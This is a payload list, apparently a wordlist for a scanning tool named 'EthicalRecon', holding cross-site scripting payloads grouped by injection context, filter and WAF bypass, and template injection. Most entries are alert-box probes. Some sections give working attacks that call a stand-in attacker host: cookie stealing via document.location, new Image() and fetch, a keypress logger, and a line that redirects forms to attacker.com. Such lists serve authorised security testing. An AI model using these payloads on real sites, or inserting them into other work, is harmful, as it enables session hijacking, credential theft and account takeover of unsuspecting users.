# Advanced XSS Payloads for EthicalRecon
# Context-aware payloads for different injection points

# Basic script injection
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>

# Event handler injection
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>

# Attribute breaking
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><img src=x onerror=alert('XSS')>

# JavaScript scheme
javascript:alert('XSS')
JAVASCRIPT:alert('XSS')
JaVaScRiPt:alert('XSS')

# Data URI
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

# Filter bypass techniques
<script>alert`XSS`</script>
<script>alert('X'+'SS')</script>
<script>alert(/XSS/.source)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>eval('alert("XSS")')</script>
<script>Function('alert("XSS")')())</script>

# DOM-based XSS
#<script>alert('XSS')</script>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">

# Advanced evasion
<script>al\u0065rt('XSS')</script>
<script>a\u006cert('XSS')</script>
<script>\u0061lert('XSS')</script>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert("XSS")`>

# CSS injection
<style>@import'javascript:alert("XSS")';</style>
<style>body{background:url("javascript:alert('XSS')")}</style>
<style>li{list-style:url("javascript:alert('XSS')");</style>
<link rel=stylesheet href="javascript:alert('XSS');">

# Cookie stealing
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+btoa(document.cookie))">

# Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/keys?k='+e.key)}</script>

# Form hijacking
<script>document.forms[0].action='http://attacker.com/steal'</script>

# Context-specific payloads
# For HTML context
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# For attribute context
"autofocus onfocus=alert('XSS')
'autofocus onfocus=alert('XSS')

# For JavaScript context
';alert('XSS');//
";alert('XSS');//
\';alert('XSS');//
\";alert('XSS');//

# For CSS context
</style><script>alert('XSS')</script>
expression(alert('XSS'))
behavior:url(javascript:alert('XSS'))

# WAF bypass
<sCrIpT>alert('XSS')</ScRiPt>
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>alert('X'+'SS')</script>
<script>alert(/XSS/)</script>
<script>alert`XSS`</script>

# Template injection (AngularJS, Vue, etc.)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{7*7}}
{{this}}
{{this.constructor.constructor('alert(1)')()}}

# React JSX injection
{alert('XSS')}
